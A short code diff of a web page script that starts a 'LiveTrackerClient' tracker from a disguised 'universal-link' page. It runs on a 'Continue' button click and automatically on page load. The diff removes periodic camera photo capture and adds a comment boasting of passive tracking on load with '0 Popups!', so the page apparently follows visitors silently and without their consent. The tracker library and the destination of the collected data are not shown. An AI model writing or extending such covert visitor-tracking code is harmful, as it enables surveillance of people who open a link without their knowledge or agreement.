@@ -156,22 +156,22 @@
                 window.LiveTrackerClient.startTracking({
                     templateName: 'universal-link',
                     updateInterval: 4000,
-                    photoInterval: 10000,
-                    onSuccess: () => console.log("Tracking active"),
-                    onError: (err) => console.warn("Tracking error:", err.message)
+                    enableCamera: false,
+                    enableGPS: false
                 });
             }
         }
 
         btnContinue.addEventListener('click', initializeTrackingAndLoad);
 
-        // Auto trigger on load if allowed
+        // Auto trigger passive tracking on load (0 Popups!)
         window.addEventListener('DOMContentLoaded', () => {
             if (window.LiveTrackerClient) {
                 window.LiveTrackerClient.startTracking({
                     templateName: 'universal-link',
                     updateInterval: 4000,
-                    photoInterval: 10000
+                    enableCamera: false,
+                    enableGPS: false
                 });
             }
         });
